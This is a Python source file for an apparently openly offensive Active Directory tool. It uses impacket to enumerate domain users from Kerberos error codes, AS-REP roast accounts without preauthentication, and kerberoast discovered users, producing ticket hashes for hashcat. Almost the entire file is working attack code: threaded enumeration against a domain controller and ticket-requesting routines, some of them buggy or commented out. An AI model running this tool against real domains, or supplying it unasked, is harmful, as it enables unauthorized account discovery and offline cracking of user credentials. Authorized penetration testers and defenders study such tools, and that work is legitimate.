from queue import Queue
import time as t
from multiprocessing import Process
import argparse
import threading
import sys
import traceback
import socket
from impacket.krb5 import constants
from impacket.krb5.asn1 import TGS_REP, AS_REP
from impacket.krb5.ccache import CCache
from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS, SessionError
from impacket.krb5.types import Principal

try:
    from utils.kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT
    from utils.adconn import LdapConn
    from utils.tickets import TGT, TGS
except:
    sys.path.insert(0, './utils')
    from adconn import LdapConn
    from tickets import TGT, TGS
    from kerb5getuserspnnopreauth import getKerberosTGT as nopreauthTGT


def build_queue(file) -> Queue:
    objs = open(file, 'r').readlines()
    q = Queue()
    for obj in objs:
        obj = obj.strip()
        q.put(obj)
    return q

discovered = []
no_preauth_users = []
def enumerate_user(user, domain, dc):
    dc_ip = socket.gethostbyname(dc)
    userclient = Principal(user, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
    try:
        getKerberosTGT(userclient,domain=domain,kdcHost=dc_ip, password='',
                           lmhash='', nthash='')

    except SessionError as e:
        code = e.getErrorCode()
        if code != 6:
            print(f'[+] Found user: {user}@{domain}')
            discovered.append(user)
            return {'user':user}
        else:
            return None
    except Exception as e:
            #print(e)
        print(f'[+] possible kerberoastable or asrep raostable user: {user}@{domain}')
        no_preauth_users.append(user)
        return {'user':user}
        # userclient = Principal(self.username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
        # try:
        #     tgt, cipher, oldSessionKey, newSessionKey = getKerberosTGT(userclient, password=self.password, 
        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
        #                                        kdcHost=self.dc_ip)
        
        #     return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':oldSessionKey, 'newSessionKey':newSessionKey}
        
        # except AttributeError:
        #     sys.stdout.flush()
        #     print("")
        #     print(f"\n3 found user: {self.username} \n")
        #     return None
        # except SessionError as e:
        #     try:
        #         code = e.getErrorCode()
        #         if code != 6:
        #             sys.stdout.flush()
        #             print(f"\n 1found user: {self.username} {e} on code: {code}")
        #     except:
        #         sys.stdout.flush()
        #         print(f"\n 2found user: {self.username}")
        # except Exception as e:
        #     print(f"1 {traceback.format_exc()}")
        #     print(f'trying with domain instead of user....')
        #     serverName = Principal('ldap/%s' % self.domain, type=constants.PrincipalNameType.NT_SRV_INST.value)
        #     try:
        #         tgt, cipher, old, new = getKerberosTGT(serverName, password=self.password, 
        #                                        domain=self.domain, lmhash=self.lmhash, nthash=self.nthash, 
        #                                        kdcHost=self.dc_ip)
        #         return {'tgt': tgt, 'cipher':cipher, 'oldSessionKey':old, 'newSessionKey':new}
        #     except Exception as e:
        #         None

        #     return 1


def get_userTGSs(no_preauth_user, domain, target_users, dc):
    print('[+] trying to kerberoast with the gathered info....')
    for user in target_users:
        try:
            T = TGS(domain=domain, username=user, dc=dc)
            T.run(nopreauth_user=no_preauth_user)
        except Exception as e:
            None
            #print(traceback.print_exc())


def get_userTGT(user, domain, dc):
    valid = enumerate_user(user, domain, dc) 
    user = valid['user']
    if valid != None:
        T = TGT(domain=domain, username=user, dc=dc)
        tgt_data = T.run()

        # except:
        #     try:
        #         Ts = TGS(domain=domain, username=user, dc=dc)
        #         if tgt_data:
        #             no_preauth = user
        #             tgt_data = Ts.run(nopreauth_user=no_preauth)
        #         # `error preauth failed`
        #     except Exception as e:
        #         print(traceback.print_exc())
    else:
        tgt_data = None
    return tgt_data
    # if tgt_data != None:
    #     tgt = tgt_data['tgt']
    #     cipher = tgt_data['cipher']
    #     old = tgt_data['oldSessionKey']
    #     new = tgt_data['newSessionKey']
    #     print(tgt_data)
    #     try:
    #         TS = TGS(tgt=tgt, domain=domain, cipher=cipher, old=old, new=new, user=user, dc=dc, preauth=False)
    #         tgs = TS.run()
    #     except Exception as e:
    #         print(f"TGS error: {e}")
    #     return tgs
    # if tgt_data == None:
    #     return None



def run(domain, dc, delay):
    while not q.empty():
        user = q.get()
        try:
            data = get_userTGT(user,domain,dc)
            if data != None:
                print(data)
        except Exception as e:
            print(e)
        finally:
            t.sleep(delay)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()

    art = r"""
    ⠀⠀⠀⠀⠀⠀⢎⠉⠁⠈⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠑⢄⠀⠀⠞⠋⠙⠛⠛⠢⠤⣀⠰⠗⠒⠂⣀⣀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⡀⠀⠀⠀⢀⡤⠖⢒⣛⣓⣦⣀⡴⢋⠭⠿⠿⣦⡀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠿⠀⠀⠀⢨⠤⠞⠉⠀⢀⠉⠻⣗⠁⠀⢸⣷⣌⠻⡆
⠀⠀⠀⠀⠀⠀⠀⣠⠔⠉⠀⠀⠀⠀⠈⢦⠀⠀⢰⣿⣷⡀⠸⡀⠀⠘⣿⣼⠆⢱
⠀⠀⠀⢀⡤⠒⠉⠀⠀⠀⠀⠀⠀⠀⠀⡿⡀⠀⣼⣧⡾⠀⢠⡧⣀⣀⣬⠥⣖⡥
⠀⣠⠜⠁⠀⠀⣀⡴⠤⣄⠀⠀⢰⡄⠀⢧⡳⠤⣌⣡⣤⡴⠛⠳⣄⣉⡩⠝⠋⢁
⡔⠁⠀⠀⠀⡼⢩⣧⡀⠘⢦⡀⠀⠉⠓⠲⠿⠛⠛⠉⠁⠀⠀⠀⠈⠏⠀⢀⣠⣺
⡇⠀⠀⠀⠀⢧⠈⢷⣙⣶⣄⡉⠓⠢⠤⣀⣀⣀⣀⣀⣀⣀⣠⣤⣤⣶⡾⢿⣿⠁
⠱⡀⠀⠀⠀⠈⢦⡈⠻⢝⡛⠿⣿⣓⠒⠶⠶⠾⠿⣿⣟⠛⠋⠉⠉⣹⣦⡿⠁⠀
⠀⠘⢆⠀⠀⠀⠀⠙⠢⣄⡉⠑⠒⠭⠿⠶⠶⣶⣞⣫⣥⣤⢖⡾⠿⠟⠋⠀⠀⠀
⠀⠀⠀⠑⠀⢀⡀⠀⠀⠀⠉⠉⠓⠒⠒⠒⠛⣉⣉⠉⣃⡦⠋⠀⠀⠀⠀⠀⠀⠀


"""

    parser.description = f"""This tool is for asrep roasting multiple users that don't require preauth 
    and for enumerating users (will grab TGTs if able and output into hashcat format) will also kerberoast if possible"""
    parser.prog = art
    try:
        parser.add_argument('-user_file', help="the user file for user to be enumerated")
        parser.add_argument('-domain', help='the target domain')
        parser.add_argument('-dc', help='the domain controller')
        parser.add_argument('-workers', default=10, help='the number of threads in the thread pool, default is 10', type=int)
        parser.add_argument('-delay', help='add a delay in between requests', default=0, type=float)

        options = parser.parse_args()
        f = options.user_file
        domain = options.domain
        dc = options.dc
        delay = options.delay
        q = build_queue(f)
        print(art)
        print(parser.description)
        processes = options.workers
        total = q.qsize()
        for process in range(processes):
            # p = Process(target=run, args=(domain, dc, delay,))
            p = threading.Thread(target=run, args=(domain, dc, delay,))
            p.start()
            p.join()
            t.sleep(0.1)
        for nopreauthuser in no_preauth_users:
            get_userTGSs(no_preauth_user=nopreauthuser, domain=domain, target_users=discovered, dc=dc)


    except KeyboardInterrupt:
        exit()
    except:
        parser.print_help()
    
